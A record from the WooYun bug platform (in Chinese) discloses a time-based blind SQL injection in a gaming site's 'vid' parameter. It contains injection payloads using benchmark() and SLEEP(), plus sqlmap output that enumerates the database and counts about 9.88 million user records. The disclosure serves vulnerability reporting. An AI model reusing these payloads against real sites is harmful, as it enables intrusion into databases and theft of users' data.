{"id": 66288, "wybug_id": "wooyun-2015-0148683", "wybug_title": "拇指玩主站一处隐秘SQL注入", "wybug_corp": "muzhiwan.com", "wybug_author": "路人甲", "wybug_date": "2015-10-22 18:43", "wybug_open_date": "2015-10-27 18:44", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["时间盲注"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-27：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 拇指玩主站注入，比较隐秘，没有任何回显，经测试用时间盲注的方式可以获取数据。用户表988w条用户数据 详细说明：  注入点：\n\nmask 区域\n1.http://**.**.**/index.phpaction=***&vid=1-benchmark(8000000,sha(1))\n\nvid存在注入\n\n\n\nbenchmark执行的次数不同，页面执行的时间也不同。   漏洞证明：  sqlmap可以直接跑sqlmap resumed the following injection point(s) from stored session:---Parameter: vid (GET)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: action=common&opt=searchHistroy&vid=1 AND (SELECT * FROM (SELECT(SLEEP(5)))iGFX)---[09:23:45] [INFO] testing MySQLdo you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] [09:23:58] [INFO] confirming MySQL[09:23:58] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors [09:24:08] [INFO] adjusting time delay to 1 second due to good response times[09:24:08] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.2.14back-end DBMS: MySQL >= 5.0.0[09:24:08] [INFO] fetching current database[09:24:08] [INFO] retrieved: mzwcurrent database:    'mzw'看看用户表数据sql-shell> select count(*) from mzw_users[09:28:53] [INFO] fetching SQL SELECT statement query output: 'select count(*) from mzw_users'[09:28:53] [INFO] retrieved: do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] [09:29:10] [INFO] adjusting time delay to 1 second due to good response times9886632select count(*) from mzw_users:    '9886632'涉及到988w用户数据！   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-10-27 18:44 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-10-22 23:02 |    \t\t有归于无 \t\t\t( 实习白帽子  |\t\t\t        Rank:84 漏洞数:16        | 有归于无)\t\t \n  最近好多主站注入    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}